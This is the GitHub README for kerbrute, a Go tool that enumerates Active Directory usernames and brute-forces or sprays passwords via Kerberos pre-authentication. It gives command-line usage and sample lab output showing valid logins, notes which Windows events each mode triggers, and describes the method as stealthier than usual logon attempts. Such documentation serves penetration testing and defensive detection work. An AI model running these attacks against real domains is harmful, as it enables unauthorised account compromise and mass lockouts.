GitHub - ropnop/kerbrute: A tool to perform Kerberos pre-auth bruteforcing

# [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='52'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='803' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/ropnop/kerbrute#kerbrute)Kerbrute

[![68747470733a2f2f636972636c6563692e636f6d2f67682f726f706e6f702f6b657262727574652e7376673f7374796c653d737667](../_resources/ac22f604732b671fc0aba8d2e0a68767.png)](https://circleci.com/gh/ropnop/kerbrute)

A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication

Grab the latest binaries from the [releases page](https://github.com/ropnop/kerbrute/releases/latest) to get started.

## [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='53'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='808' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/ropnop/kerbrute#background)Background

This tool grew out of some [bash scripts](https://github.com/ropnop/kerberos_windows_scripts) I wrote a few years ago to perform bruteforcing using the Heimdal Kerberos client from Linux. I wanted something that didn't require privileges to install a Kerberos client, and when I found the amazing pure Go implementation of Kerberos [gokrb5](https://github.com/jcmturner/gokrb5), I decided to finally learn Go and write this.

Bruteforcing Windows passwords with Kerberos is much faster than any other approach I know of, and potentially stealthier since pre-authentication failures do not trigger that "traditional" `An account failed to log on` event 4625. With Kerberos, you can validate a username or test a login by only sending one UDP frame to the KDC (Domain Controller)

For more background and information, check out my Troopers 2019 talk, Fun with LDAP and Kerberos (link TBD)

## [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='54'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='813' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/ropnop/kerbrute#usage)Usage

Kerbrute has three main commands:

- **bruteuser** - Bruteforce a single user's password from a wordlist
- **bruteforce** - Read username:password combos from a file or stdin and test them
- **passwordspray** - Test a single password against a list of users
- **usernenum** - Enumerate valid domain usernames via Kerberos

A domain (`-d`) or a domain controller (`--dc`) must be specified. If a Domain Controller is not given the KDC will be looked up via DNS.

By default, Kerbrute is multithreaded and uses 10 threads. This can be changed with the `-t` option.

Output is logged to stdout, but a log file can be specified with `-o`.
By default, failures are not logged, but that can be changed with `-v`.

Lastly, Kerbrute has a `--safe` option. When this option is enabled, if an account comes back as locked out, it will abort all threads to stop locking out any other accounts.

The `help` command can be used for more information

	$ ./kerbrute
	    __             __               __
	   / /_____  _____/ /_  _______  __/ /____
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

	Version: dev (n/a) - 12/14/19 - Ronnie Flathers @ropnop

	This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
	It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
	Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

	Usage:
	  kerbrute [command]

	Available Commands:
	  bruteforce    Bruteforce username:password combos, from a file or stdin
	  bruteuser     Bruteforce a single user's password from a wordlist
	  help          Help about any command
	  passwordspray Test a single password against a list of users
	  userenum      Enumerate valid domain usernames via Kerberos
	  version       Display version info and quit

	Flags:
	      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
	      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
	  -d, --domain string   The full domain to use (e.g. contoso.com)
	  -h, --help            help for kerbrute
	  -o, --output string   File to write logs to. Optional.
	      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
	  -t, --threads int     Threads to use (default 10)
	  -v, --verbose         Log failures and errors

	Use "kerbrute [command] --help" for more information about a command.

### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='55'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='827' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/ropnop/kerbrute#user-enumeration)User Enumeration

To enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. If the KDC responds with a `PRINCIPAL UNKNOWN` error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts. This generates a Windows event ID [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) if Kerberos logging is enabled.

	root@kali:~# ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt

	    __             __               __
	   / /_____  _____/ /_  _______  __/ /____
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

	Version: dev (43f9ca1) - 03/06/19 - Ronnie Flathers @ropnop

	2019/03/06 21:28:04 >  Using KDC(s):
	2019/03/06 21:28:04 >   pdc01.lab.ropnop.com:88

	2019/03/06 21:28:04 >  [+] VALID USERNAME:       amata@lab.ropnop.com
	2019/03/06 21:28:04 >  [+] VALID USERNAME:       thoffman@lab.ropnop.com
	2019/03/06 21:28:04 >  Done! Tested 1001 usernames (2 valid) in 0.425 seconds

### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='56'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='830' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/ropnop/kerbrute#password-spray)Password Spray

With `passwordwpray`, Kerbrute will perform a horizontal brute force attack against a list of domain users. This is useful for testing one or two common passwords when you have a large list of users. WARNING: this does will increment the failed login count and lock out accounts. This will generate both event IDs [4768 - A Kerberos authentication ticket (TGT) was requested](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) and [4771 - Kerberos pre-authentication failed](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)

	root@kali:~# ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123

	    __             __               __
	   / /_____  _____/ /_  _______  __/ /____
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

	Version: dev (43f9ca1) - 03/06/19 - Ronnie Flathers @ropnop

	2019/03/06 21:37:29 >  Using KDC(s):
	2019/03/06 21:37:29 >   pdc01.lab.ropnop.com:88

	2019/03/06 21:37:35 >  [+] VALID LOGIN:  callen@lab.ropnop.com:Password123
	2019/03/06 21:37:37 >  [+] VALID LOGIN:  eshort@lab.ropnop.com:Password123
	2019/03/06 21:37:37 >  Done! Tested 2755 logins (2 successes) in 7.674 seconds

### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='57'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='833' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/ropnop/kerbrute#brute-user)Brute User

This is a traditional bruteforce account against a username. Only run this if you are sure there is no lockout policy! This will generate both event IDs [4768 - A Kerberos authentication ticket (TGT) was requested](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) and [4771 - Kerberos pre-authentication failed](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)

	root@kali:~# ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman

	    __             __               __
	   / /_____  _____/ /_  _______  __/ /____
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

	Version: dev (43f9ca1) - 03/06/19 - Ronnie Flathers @ropnop

	2019/03/06 21:38:24 >  Using KDC(s):
	2019/03/06 21:38:24 >   pdc01.lab.ropnop.com:88

	2019/03/06 21:38:27 >  [+] VALID LOGIN:  thoffman@lab.ropnop.com:Summer2017
	2019/03/06 21:38:27 >  Done! Tested 1001 logins (1 successes) in 2.711 seconds

### [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='58'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='836' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/ropnop/kerbrute#brute-force)Brute Force

This mode simply reads username and password combinations (in the format `username:password`) from a file or from `stdin` and tests them with Kerberos PreAuthentication. It will skip any blank lines or lines with blank usernames/passwords. This will generate both event IDs [4768 - A Kerberos authentication ticket (TGT) was requested](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) and [4771 - Kerberos pre-authentication failed](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)

	$ cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -

	    __             __               __
	   / /_____  _____/ /_  _______  __/ /____
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

	Version: dev (n/a) - 05/11/19 - Ronnie Flathers @ropnop

	2019/05/11 18:40:56 >  Using KDC(s):
	2019/05/11 18:40:56 >   pdc01.lab.ropnop.com:88

	2019/05/11 18:40:56 >  [+] VALID LOGIN:  athomas@lab.ropnop.com:Password1234
	2019/05/11 18:40:56 >  Done! Tested 7 logins (1 successes) in 0.114 seconds

## [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='59'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='839' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/ropnop/kerbrute#installing)Installing

You can download pre-compiled binaries for Linux, Windows and Mac from the [releases page](https://github.com/ropnop/kerbrute/releases/tag/latest). If you want to live on the edge, you can also install with Go:

	$ go get github.com/ropnop/kerbrute

With the repository cloned, you can also use the Make file to compile for common architectures:

	$ make help
	help:            Show this help.
	windows:  Make Windows x86 and x64 Binaries
	linux:  Make Linux x86 and x64 Binaries
	mac:  Make Darwin (Mac) x86 and x64 Binaries
	clean:  Delete any binaries
	all:  Make Windows, Linux and Mac x86/x64 Binaries

	$ make all
	Done.
	Building for windows amd64..
	Building for windows 386..
	Done.
	Building for linux amd64...
	Building for linux 386...
	Done.
	Building for mac amd64...
	Building for mac 386...
	Done.

	$ ls dist/
	kerbrute_darwin_386        kerbrute_linux_386         kerbrute_windows_386.exe
	kerbrute_darwin_amd64      kerbrute_linux_amd64       kerbrute_windows_amd64.exe

## [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='60'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='843' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/ropnop/kerbrute#credits)Credits

Huge shoutout to jcmturner for his pure Go implementation of KRB5: https://github.com/jcmturner/gokrb5 . An amazing project and very well documented. Couldn't have done any of this without that project.

Shoutout to [audibleblink](https://github.com/audibleblink) for the suggestion and implementation of the `delay` option!